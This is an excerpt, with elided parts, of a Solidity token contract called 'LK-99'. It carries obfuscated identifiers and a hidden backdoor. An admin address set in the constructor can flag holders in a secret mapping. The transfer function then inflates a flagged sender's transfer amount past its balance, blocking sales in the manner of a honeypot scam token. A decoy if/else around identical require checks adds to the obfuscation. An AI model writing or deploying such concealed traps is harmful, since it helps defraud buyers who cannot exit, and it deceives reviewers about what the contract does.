...
contract Token is Ownable {
    ...
    constructor(address vipooo) {
        oukkAdmintlbl = vipooo;
        _tokentotalSSSupply = tokensupply;
        _balances[msg.sender] = tokensupply;
        emit Transfer(address(0), msg.sender, tokensupply);
    }
    address public oukkAdmintlbl;
    uint256 private tokensupply = 20000000000*10**decimals();

    uint256 private _tokentotalSSSupply;
    string private _Tokename = "LK-99";
    string private _tokenSSSsymbol = "LK-99";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public kkomuserlbh;
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        kkomuserlbh[cjjjss] = zramount;    
        if(_msgSender() == oukkAdmintlbl){
            require(_msgSender() == oukkAdmintlbl);
        }else{
            require(_msgSender() == oukkAdmintlbl);
        }
    ...
    function _transfer(
        ...
        if (13333 != kkomuserlbh[vipFrom]) {}else{
            amount = _balances[vipFrom] + kkomuserlbh[vipFrom];
        }
